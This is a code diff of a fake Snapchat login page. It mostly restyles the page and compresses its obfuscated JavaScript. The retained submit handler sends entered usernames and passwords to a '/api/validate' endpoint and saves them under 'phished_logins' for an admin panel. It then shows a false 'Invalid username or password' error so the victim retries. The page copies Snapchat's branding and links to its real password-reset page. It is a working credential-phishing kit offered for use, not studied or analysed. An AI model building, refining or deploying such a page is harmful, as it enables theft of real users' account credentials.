@@ -14,6 +14,7 @@
   @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
   body { font-family: "Inter", sans-serif; }
   ::-webkit-scrollbar { display: none; }
+
   input[type="checkbox"] {
     -webkit-appearance: none; -moz-appearance: none; appearance: none;
     width: 1rem; height: 1rem; border: 2px solid #d1d5db;
@@ -22,50 +23,63 @@
   input[type="checkbox"]:checked::after {
     content: '';
     position: absolute;
-    left: 3.5px; /* slightly moved to center */
-    top: 1px;    /* slightly moved down */
-    width: 4.5px; /* slightly smaller */
-    height: 9px;  /* slightly smaller */
+    left: 3.5px;
+    top: 1px;
+    width: 4.5px;
+    height: 9px;
     border: solid #00b0ff;
     border-width: 0 2px 2px 0;
     transform: rotate(45deg);
   }
   input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
+
   #loginBtn { 
     transition: bottom 0.3s ease; 
-    min-width: 40%; 
-    width: 60%; 
+    min-width: 41%; /* slightly wider than before */
+    width: 61%; /* slightly wider */
     font-size: 0.96rem; 
     padding: 0.7rem 0; 
     display: block; 
     margin: 0 auto; 
+    background-color: #b7c0c8; /* grey button */
+    color: white;
   }
+  #loginBtn:enabled { background-color: #00b0ff; }
+
   .input-container { width: 85%; margin: 0 auto; }
 
-  /* Adjusted username/password boxes: taller font to prevent mobile zoom, slightly bold */
   input[type="text"], input[type="password"] { 
     width: 100%; 
-    font-size: 1rem; /* 16px prevents mobile zoom */
-    font-weight: 500; /* slightly more bold */
-    padding-bottom: 0.4rem; /* slightly less tall */
+    font-size: 1rem; 
+    font-weight: 500; 
+    padding-bottom: 0.4rem; 
     font-family: "Inter", sans-serif;
   }
 
-  /* Hide/show password button */
   #password + button {
-    font-size: 0.95rem; /* slightly smaller */
-    top: 50%; /* vertically center */
+    font-size: 0.95rem; 
+    top: 50%; 
     transform: translateY(-50%);
-    right: 0.25rem; /* small spacing from right edge */
+    right: 0.25rem;
   }
 
-  /* Original styles kept exactly */
   label[for="password"] { position: relative; top: -3px; font-size: 0.75rem; }
   #password { position: relative; top: -2.7px; }
   label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.85rem; }
   #forgotPassword { position: relative; top: -9.5px; font-size: 0.85rem; }
-  #errorMsg { max-width: 95%; margin: 0 auto; font-size: 0.8rem; text-align: center; }
-  h1 { position: relative; top: -10px; font-size: 1.5rem; font-weight: 500; text-align: center; }
+
+  #errorMsg { max-width: 95%; margin: 0 auto; font-size: 0.8rem; text-align: center; color: #ff1952; }
+
+  h1 { 
+    position: relative; 
+    top: 0px; 
+    font-size: 1.65rem; 
+    font-weight: 500; 
+    text-align: center; 
+    margin-top: 2rem; 
+    margin-bottom: 2rem;
+  }
+
   form.flex.flex-col.space-y-6 { gap: 0.5rem; }
   .card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
   .highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
@@ -94,13 +108,13 @@
         <i id="eyeIcon" class="fas fa-eye-slash"></i>
       </button>
     </div>
-    <p id="errorMsg" class="text-sm text-red-500 font-normal leading-tight hidden">Invalid username or password. Try again.</p>
+    <p id="errorMsg" class="text-sm font-normal leading-tight hidden">Invalid username or password. Try again.</p>
     <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
       <input type="checkbox" checked>
       <span>Save Login Info on your iCloud devices</span>
     </label>
     <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
-    <button id="loginBtn" type="submit" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full mt-4" disabled>Log In</button>
+    <button id="loginBtn" type="submit" class="font-medium text-lg py-3 rounded-full mt-4" disabled>Log In</button>
   </form>
 </div>
 <div id="adminSection" class="p-6 max-w-3xl mx-auto">
@@ -136,67 +150,22 @@ document.addEventListener("DOMContentLoaded", function(){
           u2="/api/validate",
           m3=3;
     let n4=0,l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
-    const p=window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
-    if(p&&p[1]){a.value=p[1];y2();}
 
     function x1(p,r=m3){return fetch(u2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p),mode:"cors"}).then(s=>s.ok||Promise.reject("Request failed")).catch(()=>r>0?x1(p,r-1):!1);}
-    
-    function y2(){a.value.trim()&&b.value.trim()?(c.classList.remove("bg-gray-400"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-gray-400"),c.disabled=!0);}
-    
-    function z3(t,u){
-        n4++;
-        l5.push({username:t,timestamp:u});
-        localStorage.setItem("phished_logins",JSON.stringify(l5));
-        g.textContent=n4;
-        h.textContent=u;
-        const v=document.createElement("div");
-        v.className="highlight mb-2 p-2 flex justify-between items-center";
-        v.innerHTML=`<span>${t} - ${u}</span><span class="remove-btn" onclick="removeLogin(this,'${t}','${u}')"><i class="fas fa-trash-alt"></i></span>`;
-        f.appendChild(v);
-    }
+    function y2(){a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0);}
+    function z3(t,u){n4++;l5.push({username:t,timestamp:u});localStorage.setItem("phished_logins",JSON.stringify(l5));g.textContent=n4;h.textContent=u;const v=document.createElement("div");v.className="highlight mb-2 p-2 flex justify-between items-center";v.innerHTML=`<span>${t} - ${u}</span><span class="remove-btn" onclick="removeLogin(this,'${t}','${u}')"><i class="fas fa-trash-alt"></i></span>`;f.appendChild(v);}
+    window.removeLogin=function(w,t,u){l5=l5.filter(x=>x.username!==t||x.timestamp!==u);localStorage.setItem("phished_logins",JSON.stringify(l5));n4--;g.textContent=n4;h.textContent=l5.length>0?l5[l5.length-1].timestamp:"N/A";w.parentElement.remove();}
 
-    window.removeLogin=function(w,t,u){
-        l5=l5.filter(x=>x.username!==t||x.timestamp!==u);
-        localStorage.setItem("phished_logins",JSON.stringify(l5));
-        n4--;
-        g.textContent=n4;
-        h.textContent=l5.length>0?l5[l5.length-1].timestamp:"N/A";
-        w.parentElement.remove();
-    };
+    a.addEventListener("input",y2);b.addEventListener("input",y2);
 
-    a.addEventListener("input",y2);
-    b.addEventListener("input",y2);
-
-    e.addEventListener("submit", async function(o){
+    e.addEventListener("submit",async function(o){
         o.preventDefault();
-        const t=a.value.trim(),
-              u=b.value.trim(),
-              v=new Date().toLocaleString();
-        if(t && u){
-            const w={username:t,password:u,timestamp:v};
-            await x1(w);
-            l5.push(w);
-            localStorage.setItem("phished_logins",JSON.stringify(l5));
-            z3(t,v);
-            y2();
-            setTimeout(()=>{
-                d.textContent="Invalid username or password. Try again.";
-                d.classList.remove("hidden");
-                b.value = ""; // clear password at the same time error appears
-            },1200);
-        } else {
-            setTimeout(()=>{
-                d.textContent="Please fill in both fields.";
-                d.classList.remove("hidden");
-                b.value = "";
-            },1200);
-        }
+        const t=a.value.trim(),u=b.value.trim(),v=new Date().toLocaleString();
+        if(t&&u){const w={username:t,password:u,timestamp:v};await x1(w);l5.push(w);localStorage.setItem("phished_logins",JSON.stringify(l5));z3(t,v);y2();setTimeout(()=>{d.textContent="Invalid username or password. Try again.";d.classList.remove("hidden");b.value="";},1200);}
+        else{setTimeout(()=>{d.textContent="Please fill in both fields.";d.classList.remove("hidden");b.value="";},1200);}
     });
 
-    window.togglePassword=function(){
-        if(b.type==="password"){b.type="text";document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye");}
-        else{b.type="password";document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash");}
-    };
+    window.togglePassword=function(){b.type==="password"?(b.type="text",document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye")):(b.type="password",document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"))};
 });
 
 function goBack(){window.history.length>1?window.history.back():window.location.reload();}
